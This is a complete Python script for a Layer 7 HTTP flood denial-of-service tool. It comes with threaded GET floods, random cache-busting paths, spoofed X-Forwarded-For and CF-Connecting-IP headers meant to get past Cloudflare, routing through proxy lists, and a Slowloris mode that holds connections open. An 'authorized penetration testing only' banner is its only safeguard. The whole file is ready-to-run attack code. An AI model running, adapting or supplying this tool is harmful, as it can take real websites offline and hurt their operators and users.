#!/usr/bin/env python3
"""
Layer 7 HTTP/HTTPS Flood with Cloudflare Bypass
FOR AUTHORIZED PENETRATION TESTING ONLY
"""

import socket
import ssl
import threading
import random
import time
import sys
import argparse
import os
import json
import urllib.parse
from datetime import datetime

# Try imports
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore: RED=GREEN=YELLOW=CYAN=MAGENTA=RESET=''
    class Style: BRIGHT=DIM=RESET_ALL=''

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
]

PATHS = [
    "/", "/index.html", "/wp-admin/", "/admin/", "/api/v1/", "/api/",
    "/login", "/register", "/search", "/about", "/contact", "/products",
    "/css/style.css", "/js/app.js", "/favicon.ico", "/robots.txt",
    "/sitemap.xml", "/.env", "/config.php", "/status", "/health",
    "/graphql", "/v1/", "/v2/", "/latest", "/news", "/blog",
]

CF_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "CF-Connecting-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "Forwarded",
]


class HTTPFlooder:
    def __init__(self, target, port, ssl_mode, threads, duration, proxy_file=None, slowloris=False, cf_bypass=True):
        self.target = target
        self.port = port
        self.ssl_mode = ssl_mode
        self.threads = threads
        self.duration = duration
        self.slowloris = slowloris
        self.cf_bypass = cf_bypass
        self.running = True
        
        self.requests_sent = 0
        self.bytes_sent = 0
        self.failures = 0
        self.lock = threading.Lock()
        
        # Resolve target
        try:
            self.target_ip = socket.gethostbyname(target)
        except:
            self.target_ip = target
        
        # Load proxies
        self.proxies = []
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':')
                        self.proxies.append((parts[0], int(parts[1])))
            print(f"{Fore.GREEN}[*] Loaded {len(self.proxies)} proxies{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}[*] Target: {target} ({self.target_ip}:{port})")
        print(f"[*] SSL: {ssl_mode}, Threads: {threads}, Duration: {duration}s")
        print(f"[*] Slowloris: {slowloris}, CF-Bypass: {cf_bypass}{Style.RESET_ALL}")

    def _rand_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

    def _build_request(self, path=None):
        if path is None:
            path = random.choice(PATHS)
            # Cache buster
            if random.random() > 0.5:
                path += f"?{random.randint(100000,999999)}"
        
        ua = random.choice(USER_AGENTS)
        fake_ip = self._rand_ip()
        
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: {ua}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1",
            "Sec-Fetch-Dest: document",
            "Sec-Fetch-Mode: navigate",
            "Sec-Fetch-Site: none",
            "Sec-Fetch-User: ?1",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
        ]
        
        if self.cf_bypass:
            lines.append(f"X-Forwarded-For: {fake_ip}")
            lines.append(f"X-Real-IP: {fake_ip}")
            lines.append(f"CF-Connecting-IP: {fake_ip}")
            lines.append(f"X-Originating-IP: {fake_ip}")
            lines.append(f"Forwarded: for={fake_ip};proto={'https' if self.ssl_mode else 'http'}")
        
        # Random referer
        referers = [
            "https://www.google.com/search?q=test",
            "https://www.bing.com/search?q=test",
            f"https://www.facebook.com/sharer.php?u=https://{self.target}",
            f"https://twitter.com/intent/tweet?url=https://{self.target}",
            f"https://{self.target}/",
        ]
        lines.append(f"Referer: {random.choice(referers)}")
        lines.append("")
        
        return "\r\n".join(lines)

    def http_worker(self):
        while self.running:
            try:
                if self.proxies:
                    proxy = random.choice(self.proxies)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect(proxy)
                    
                    # CONNECT request for SSL through proxy
                    if self.ssl_mode:
                        connect_req = f"CONNECT {self.target}:{self.port} HTTP/1.1\r\nHost: {self.target}:{self.port}\r\n\r\n"
                        sock.send(connect_req.encode())
                        sock.recv(4096)
                        
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        ssock = ctx.wrap_socket(sock, server_hostname=self.target)
                        
                        request = self._build_request()
                        ssock.send(request.encode())
                        try:
                            ssock.recv(4096)
                        except:
                            pass
                        ssock.close()
                    else:
                        request = self._build_request()
                        sock.send(request.encode())
                        try:
                            sock.recv(4096)
                        except:
                            pass
                        sock.close()
                else:
                    # Direct connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if self.ssl_mode:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM')
                        
                        sock.connect((self.target_ip, self.port))
                        ssock = ctx.wrap_socket(sock, server_hostname=self.target)
                        
                        request = self._build_request()
                        ssock.send(request.encode())
                        try:
                            response = ssock.recv(4096).decode('utf-8', errors='ignore')
                            # Check for Cloudflare challenge
                            if self.cf_bypass and ('cf-browser-verification' in response or 
                                                     'jschl_answer' in response or
                                                     '__cf_chl_f_tk' in response):
                                pass  # Challenge detected, but we keep sending
                        except:
                            pass
                        ssock.close()
                    else:
                        sock.connect((self.target_ip, self.port))
                        request = self._build_request()
                        sock.send(request.encode())
                        try:
                            sock.recv(4096)
                        except:
                            pass
                        sock.close()
                
                with self.lock:
                    self.requests_sent += 1
                    self.bytes_sent += len(request)
                    
            except Exception:
                with self.lock:
                    self.failures += 1

    def slowloris_worker(self):
        """Slowloris - keep connections open sending partial headers"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.target_ip, self.port))
                
                if self.ssl_mode:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ssock = ctx.wrap_socket(sock, server_hostname=self.target)
                else:
                    ssock = sock
                
                # Send partial request
                ssock.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
                ssock.send(f"Host: {self.target}\r\n".encode())
                ssock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                
                # Keep sending header lines
                start = time.time()
                while self.running and (time.time() - start) < 300:
                    ssock.send(f"X-Random-{random.randint(1,100000)}: {random.randint(1,100000)}\r\n".encode())
                    time.sleep(random.randint(5, 15))
                    with self.lock:
                        self.requests_sent += 1
                
                ssock.close()
            except:
                with self.lock:
                    self.failures += 1

    def start(self):
        print(f"{Fore.YELLOW}[*] Starting attack...{Style.RESET_ALL}\n")
        
        worker_func = self.slowloris_worker if self.slowloris else self.http_worker
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=worker_func, daemon=True)
            t.start()
            threads.append(t)
        
        # Stats reporting
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                with self.lock:
                    reqs = self.requests_sent
                    bytes_s = self.bytes_sent
                    fails = self.failures
                
                elapsed = time.time() - start_time
                mb_sent = bytes_s / (1024 * 1024)
                mbps = mb_sent / elapsed if elapsed > 0 else 0
                
                sys.stdout.write(
                    f"\r{Fore.GREEN}[>] {Fore.CYAN}{reqs:,}{Fore.GREEN} requests | "
                    f"{Fore.YELLOW}{mb_sent:.1f} MB{Fore.GREEN} sent | "
                    f"{Fore.MAGENTA}{mbps:.1f} MB/s{Fore.GREEN} | "
                    f"{Fore.RED}{fails:,}{Fore.GREEN} failures{Style.RESET_ALL}"
                )
                sys.stdout.flush()
        except KeyboardInterrupt:
            pass
        
        self.running = False
        elapsed = time.time() - start_time
        
        with self.lock:
            reqs = self.requests_sent
            bytes_s = self.bytes_sent
            fails = self.failures
        
        mb_sent = bytes_s / (1024 * 1024)
        gb_sent = mb_sent / 1024
        mbps = mb_sent / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{Fore.CYAN}═══════════════════════════════════════")
        print(f"  ATTACK COMPLETE")
        print(f"═══════════════════════════════════════")
        print(f"  Requests:    {reqs:,}")
        print(f"  Data sent:   {mb_sent:.1f} MB ({gb_sent:.3f} GB)")
        print(f"  Avg rate:    {mbps:.1f} MB/s")
        print(f"  Failures:    {fails:,}")
        print(f"  Duration:    {elapsed:.1f}s")
        print(f"═══════════════════════════════════════{Style.RESET_ALL}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Layer 7 HTTP Flood Tool - Authorized Testing Only")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=200, help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--ssl", action="store_true", help="Use HTTPS")
    parser.add_argument("--cf-bypass", action="store_true", help="Enable Cloudflare bypass headers")
    parser.add_argument("--slowloris", action="store_true", help="Use Slowloris mode")
    parser.add_argument("--proxy-list", help="File with proxies (ip:port per line)")
    
    args = parser.parse_args()
    
    print(f"{Fore.RED}")
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║      LAYER 7 HTTP FLOOD - CF BYPASS ENGINE      ║")
    print("  ║       FOR AUTHORIZED PENETRATION TESTING ONLY    ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    flooder = HTTPFlooder(
        target=args.target,
        port=args.port,
        ssl_mode=args.ssl,
        threads=args.threads,
        duration=args.duration,
        proxy_file=args.proxy_list,
        slowloris=args.slowloris,
        cf_bypass=args.cf_bypass,
    )
    
    flooder.start()
